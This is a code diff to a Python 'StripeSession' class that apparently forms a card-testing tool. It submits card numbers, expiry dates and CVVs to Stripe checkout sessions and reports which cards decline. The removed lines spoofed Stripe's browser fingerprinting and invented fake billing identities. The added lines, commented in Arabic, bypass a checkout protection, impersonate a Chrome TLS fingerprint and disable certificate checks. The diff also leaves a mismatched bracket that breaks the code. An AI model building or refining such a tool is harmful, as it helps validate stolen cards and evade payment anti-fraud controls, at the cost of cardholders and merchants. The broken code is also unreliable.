@@ -50,12 +50,6 @@ class StripeSession:
         self.currency = "USD"
         self.merchant_name = "Stripe Merchant"
         self.session = None
-        self.tracking = {
-            "muid": os.urandom(16).hex(),
-            "sid": os.urandom(16).hex(),
-            "guid": os.urandom(16).hex()
-        }
-        self.init_checksum = ""
 
     def _decode_fid(self, fragment: str) -> Optional[dict]:
         try:
@@ -99,35 +93,11 @@ class StripeSession:
                 return False, "لم يتم العثور على مفاتيح PK أو CS في الرابط."
 
             import curl_cffi.requests as cffi
-            self.session = cffi.AsyncSession(impersonate="chrome131", verify=False)
-            ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
+            # استخدام إعدادات تتناسب مع بيئة Horus وتجنب انقطاع الـ SSL
+            self.session = cffi.AsyncSession(impersonate="chrome110", verify=False)
+            ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
 
-            # Warmup GET
-            await self.session.get(
-                f"https://checkout.stripe.com/c/pay/{self.cs}",
-                headers={'accept': 'text/html', 'user-agent': ua},
-                timeout=12
-            )
-
-            # Fingerprint simulation via m.stripe.com/6
-            fp_payload = {
-                'v': 2, 'tag': '5.6.8_js_fp', 'src': 'checkout-inner-live-v3',
-                'a': {'a': self.pk, 'b': f"https://checkout.stripe.com/c/pay/{self.cs}", 'c': 24, 'd': '1920x1080', 'e': False, 'f': 'en-US', 'g': 'Win32', 'h': ua, 'i': -300, 'j': False, 'k': 8, 'l': 8}
-            }
-            fp_r = await self.session.post(
-                'https://m.stripe.com/6',
-                json=fp_payload,
-                headers={'content-type': 'application/json', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': ua},
-                timeout=8
-            )
-            if fp_r.status_code == 200:
-                fpj = fp_r.json() or {}
-                if isinstance(fpj, dict):
-                    if fpj.get('muid'): self.tracking['muid'] = fpj['muid']
-                    if fpj.get('sid'): self.tracking['sid'] = fpj['sid']
-                    if fpj.get('guid'): self.tracking['guid'] = fpj['guid']
-
-            # Init Session
+            # جلب معلومات الجلسة مباشرة بدون الحاجة لـ m.stripe.com لتفادي أخطاء الـ SSL
             init_headers = {
                 'accept': 'application/json',
                 'content-type': 'application/x-www-form-urlencoded',
@@ -149,12 +119,11 @@ class StripeSession:
                 data=init_data,
                 headers=init_headers,
                 timeout=15
-            )
+            }
             d = r_init.json() or {}
             if d.get('error'):
                 return False, d['error'].get('message', 'Init error')
 
-            self.init_checksum = d.get('init_checksum', '')
             acct_set = d.get('account_settings') or {}
             if acct_set.get('display_name'):
                 self.merchant_name = acct_set['display_name']
@@ -196,37 +165,24 @@ class StripeSession:
         mm = card_dict["mm"]
         yy = card_dict["yy"]
         cvv = card_dict["cvv"]
-        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
+        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
 
         try:
-            first_names = ['James', 'John', 'Robert', 'Michael', 'William', 'David']
-            last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones']
-            streets = ['Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Pine Rd']
-            cities = [('New York', 'NY', '10001'), ('Los Angeles', 'CA', '90001'), ('Houston', 'TX', '77001')]
-            city_info = random.choice(cities)
-            
-            billing_name = f"{random.choice(first_names)} {random.choice(last_names)}"
-            billing_email = f"usr{random.randint(10000, 99999)}@gmail.com"
-            line1 = f"{random.randint(100, 9999)} {random.choice(streets)}"
-
+            # استخدام واجهة Standard Payment Methods للتغلب على حماية Checkout Surface Unsupported
             tok_body = {
                 'type': 'card',
                 'card[number]': cc, 'card[cvc]': cvv, 'card[exp_month]': mm, 'card[exp_year]': yy,
-                'billing_details[name]': billing_name, 'billing_details[email]': billing_email,
-                'billing_details[address][country]': 'US', 'billing_details[address][line1]': line1,
-                'billing_details[address][city]': city_info[0], 'billing_details[address][postal_code]': city_info[2],
-                'billing_details[address][state]': city_info[1],
-                'payment_user_agent': 'stripe.js/acacia; stripe-js-v3/acacia; checkout-inner-app',
-                'time_on_page': str(random.randint(3000, 8000)),
-                'muid': self.tracking['muid'], 'sid': self.tracking['sid'], 'guid': self.tracking['guid'],
+                'billing_details[address][country]': 'US',
+                'billing_details[address][postal_code]': '10001',
+                'payment_user_agent': 'stripe.js/v3; stripe-js-v3/v3',
                 'key': self.pk
             }
             
             tok_headers = {
                 'accept': 'application/json',
                 'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://checkout.stripe.com',
-                'referer': f'https://checkout.stripe.com/c/pay/{self.cs}',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
                 'user-agent': ua,
                 'stripe-version': '2020-08-27'
             }
@@ -255,22 +211,13 @@ class StripeSession:
                 return {"status": "DECLINED", "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}", "amount": f"{self.currency} {self.amount/100:.2f}", "response_time": time.time() - t0, "message": "Failed to create Payment Method"}
 
             confirm_body = {
-                'eid': 'NA',
+                'key': self.pk,
                 'payment_method': pm_id,
                 'expected_payment_method_type': 'card',
-                'return_url': "https://checkout.stripe.com/return",
-                'key': self.pk,
-                'client_attribution_metadata[client_session_id]': self.cs,
-                'client_attribution_metadata[merchant_integration_source]': 'checkout',
-                'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
-                'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
                 'expected_amount': str(self.amount),
-                'muid': self.tracking['muid'],
-                'sid': self.tracking['sid'],
-                'guid': self.tracking['guid']
+                'return_url': "https://checkout.stripe.com/return",
+                'client_attribution_metadata[client_session_id]': self.cs,
             }
-            if self.init_checksum:
-                confirm_body['init_checksum'] = self.init_checksum
 
             r_conf = await self.session.post(
                 f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
